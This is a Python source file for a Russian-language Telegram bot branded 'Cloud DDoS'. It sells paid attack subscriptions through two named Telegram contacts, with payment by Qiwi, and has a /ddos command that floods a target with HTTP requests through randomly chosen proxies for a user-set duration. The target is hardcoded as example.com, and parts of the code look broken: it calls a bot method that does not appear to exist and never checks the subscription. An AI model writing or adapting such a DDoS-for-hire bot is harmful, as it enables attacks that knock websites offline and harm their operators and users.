


import telebot
from telebot import types
import requests
import random
import time

bot = telebot.TeleBot("YOUR_TOKEN_HERE")

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(row_width=2)
    item1 = types.KeyboardButton('/vip')
    item2 = types.KeyboardButton('/ddos')
    markup.add(item1, item2)
    bot.send_message(message.chat.id, "👋 Привет! 👋\n👽 Добро пожаловать в Cloud DDoS!\n⌨️ Выберите команду:", reply_markup=markup)

@bot.message_handler(commands=['vip'])
def vip(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    item1 = types.InlineKeyboardButton("150 потоков, 170 сек/в неделю - 50₽", callback_data='vip_1')
    item2 = types.InlineKeyboardButton("200 потоков, 220 сек/в неделю - 100₽", callback_data='vip_2')
    item3 = types.InlineKeyboardButton("250 потоков, 270 сек/в неделю - 150₽", callback_data='vip_3')
    item4 = types.InlineKeyboardButton("300 потоков, 500 сек/в неделю - 200₽", callback_data='vip_4')
    markup.add(item1, item2, item3, item4)
    bot.send_message(message.chat.id, "💎 Выберите подписку:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data.startswith('vip'):
        bot.answer_callback_query(callback_query_id=call.id, text="Вы выбрали подписку " + call.data)
        bot.send_message(call.message.chat.id, "📲 Для оплаты подписки напишите в личные сообщения к @progress135top и @Jacktr333 и укажите номер выбранной подписки. Оплата производится через Киви.")

@bot.message_handler(commands=['ddos'])
def ddos(message):
    bot.send_message(message.chat.id, "🚀 Команда /ddos:\n⚠️ Для использования этой функции необходима подписка. Для покупки подписки напишите команду /vip")

    # Проверяем наличие файла с прокси
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.read().splitlines()
    except FileNotFoundError:
        bot.send_message(message.chat.id, "❌ Ошибка: файл с прокси не найден.")
        return

    # Запрашиваем у пользователя количество запросов и время задержки
    bot.send_message(message.chat.id, "🔢 Введите количество запросов в секунду (от 0 до 200):")
    requests_per_second = int(bot.wait_for_message(message.chat.id).text)
    bot.send_message(message.chat.id, "⏰ Введите время задержки между запросами в секундах (от 0 до 200):")
    delay = int(bot.wait_for_message(message.chat.id).text)

    # Запрашиваем у пользователя время окончания атаки
    bot.send_message(message.chat.id, "⏳ Введите время окончания атаки в секундах (от 0 до 120):")
    attack_time = int(bot.wait_for_message(message.chat.id).text)

    # Начинаем атаку
    bot.send_message(message.chat.id, "🔥 Атака началась!")
    start_time = time.time()
    while time.time() - start_time < attack_time:
        for i in range(requests_per_second):
            proxy = {'http': 'http://' + random.choice(proxies)}
            try:
                requests.get('https://example.com', proxies=proxy)
            except:
                pass
        time.sleep(delay)
    bot.send_message(message.chat.id, "🛑 Атака завершена!")
    
bot.polling()
